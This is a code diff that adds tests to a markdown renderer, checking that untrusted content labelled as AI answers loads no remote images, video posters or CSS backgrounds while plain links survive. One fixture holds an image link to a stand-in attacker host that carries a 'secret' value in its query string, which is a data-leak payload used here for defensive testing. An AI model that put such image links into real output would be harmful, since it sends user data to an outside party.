@@ -127,3 +127,18 @@ describe('toPlainText', () => {
     )
   })
 })
+
+describe('untrusted content (AI answers)', () => {
+  it('never loads remote media or styles', () => {
+    const html = renderMarkdown(
+      '![x](https://evil.example/leak?d=secret)\n\n<img src="//evil.example/a.png"><video poster="https://e.x/p.png"></video>\n\n<span style="background:url(https://e.x/b)">s</span>\n\n[Link](https://ok.example)',
+      { untrusted: true },
+    )
+    expect(html).not.toMatch(/evil\.example|e\.x\/|style=/)
+    expect(html).toContain('href="https://ok.example"')
+  })
+
+  it('keeps remote images in normal notes', () => {
+    expect(renderMarkdown('![x](https://example.com/a.png)')).toContain('src="https://example.com/a.png"')
+  })
+})
